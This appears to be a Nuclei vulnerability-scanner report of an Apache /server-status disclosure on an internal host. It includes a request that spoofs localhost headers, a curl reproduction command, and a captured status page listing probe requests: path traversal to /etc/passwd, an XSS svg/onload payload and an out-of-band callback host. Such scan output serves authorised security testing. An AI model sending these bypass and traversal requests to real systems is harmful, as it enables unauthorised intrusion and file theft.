### Server Status Disclosure (server-status-localhost) found on https://10.10.84.67
---
**Details**: **server-status-localhost**  matched at https://10.10.84.67

**Protocol**: HTTP

**Full URL**: https://10.10.84.67/server-status

**Timestamp**: Fri Apr 7 09:02:34 +0100 BST 2023

**Template Information**

| Key | Value |
|---|---|
| Name | Server Status Disclosure |
| Authors | pdteam, geeknik |
| Tags | apache, debug |
| Severity | low |

**Request**
```http
GET /server-status HTTP/1.1
Host: 10.10.84.67
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Forwarded: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-IP: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-True-IP: 127.0.0.1
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=ISO-8859-1
Date: Fri, 07 Apr 2023 08:02:24 GMT
Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html><head>
<title>Apache Status</title>
</head><body>
<h1>Apache Server Status for 10.10.84.67 (via 10.10.84.67)</h1>

<dl><dt>Server Version: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28</dt>
<dt>Server MPM: WinNT</dt>
<dt>Apache Lounge VC11 Server built: Jul  7 2016 11:13:22
</dt></dl><hr /><dl>
<dt>Current Time: Friday, 07-Apr-2023 09:02:24 GMT Daylight Time</dt>
<dt>Restart Time: Friday, 07-Apr-2023 08:36:56 GMT Daylight Time</dt>
<dt>Parent Server Config. Generation: 1</dt>
<dt>Parent Server MPM Generation: 0</dt>
<dt>Server uptime:  25 minutes 28 seconds</dt>
<dt>Server load: -1.00 -1.00 -1.00</dt>
<dt>Total accesses: 8073 - Total Traffic: 1.8 MB</dt>
<dt>5.28 requests/sec - 1202 B/second - 227 B/request</dt>
<dt>14 requests currently being processed, 136 idle workers</dt>
</dl><pre>________________________________________________________________
_______________________________________________R__RCRR________RR
___RR____R__W_RC_R____</pre>
<p>Scoreboard Key:<br />
"<b><code>_</code></b>" Waiting for Connection, 
"<b><code>S</code></b>" Starting up, 
"<b><code>R</code></b>" Reading Request,<br />
"<b><code>W</code></b>" Sending Reply, 
"<b><code>K</code></b>" Keepalive (read), 
"<b><code>D</code></b>" DNS Lookup,<br />
"<b><code>C</code></b>" Closing connection, 
"<b><code>L</code></b>" Logging, 
"<b><code>G</code></b>" Gracefully finishing,<br /> 
"<b><code>I</code></b>" Idle cleanup of worker, 
"<b><code>.</code></b>" Open slot with no current process<br />
<p />


<table border="0"><tr><th>Srv</th><th>PID</th><th>Acc</th><th>M</th><th>SS</th><th>Req</th><th>Conn</th><th>Child</th><th>Slot</th><th>Client</th><th>Protocol</th><th>VHost</th><th>Request</th></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/223/223</td><td><b>R</b>
</td><td>0</td><td>0</td><td>0.0</td><td>0.03</td><td>0.03
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>GET /system/console?.css HTTP/1.1</td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/361/361</td><td>_
</td><td>0</td><td>0</td><td>0.0</td><td>0.07</td><td>0.07
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>GET /_next/../../../../../../../../../../etc/passwd HTTP/1.1</td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/233/233</td><td>_
</td><td>0</td><td>15</td><td>0.0</td><td>0.01</td><td>0.01
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>GET / HTTP/1.1</td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/223/223</td><td><b>R</b>
</td><td>7</td><td>0</td><td>0.0</td><td>0.01</td><td>0.01
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap></td><td nowrap></td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>1/147/147</td><td><b>C</b>
</td><td>0</td><td>0</td><td>0.0</td><td>0.01</td><td>0.01
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>GET /wp-content/themes/catch-box/style.css HTTP/1.1</td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/119/119</td><td><b>R</b>
</td><td>0</td><td>0</td><td>0.0</td><td>0.01</td><td>0.01
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>GET /lua/.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%</td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/266/266</td><td><b>R</b>
</td><td>0</td><td>0</td><td>0.0</td><td>0.01</td><td>0.01
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>GET cgnsprs2od8l6gv00t90z9dhq6jpgkam8.oast.live:80/ HTTP/1.1</td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/63/63</td><td>_
</td><td>104</td><td>15</td><td>0.0</td><td>0.04</td><td>0.04
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>POST /fileDownload?action=downloadBackupFile HTTP/1.1</td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/148/148</td><td>_
</td><td>0</td><td>0</td><td>0.0</td><td>0.01</td><td>0.01
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>GET /goform/login_process?username=test%22%3E%3Csvg/onload=aler</td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/126/126</td><td>_
</td><td>0</td><td>0</td><td>0.0</td><td>0.03</td><td>0.03
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>GET /api/v4/users/83 HTTP/1.1</td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/203/203</td><td>_
</td><td>80</td><td>0</td><td>0.0</td><td>0.02</td><td>0.02
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>GET /index.php?class=../../../../../../../etc/passwd%00 HTTP/1.</td></tr>

<tr><td><b>0-0</b></td><td>332</td><td>0/126/126</td><td>_
</td><td>92</td><td>15</td><td>0.0</td><td>0.09</td><td>0.09
</td><td>10.14.43.145</td><td>http/1.1</td><td nowrap>www.example.com:443</td><td nowrap>GET /ws2020/ HTTP/1.1</td></tr>
.... Truncated ....
```


**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Forwarded: 127.0.0.1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36' -H 'X-Client-IP: 127.0.0.1' -H 'X-Forwarded-By: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Forwarded-For-IP: 127.0.0.1' -H 'X-Forwarded-Host: 127.0.0.1' -H 'X-Host: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-True-IP: 127.0.0.1' 'https://10.10.84.67/server-status'
```
---
Generated by [Nuclei 2.9.0](https://github.com/projectdiscovery/nuclei)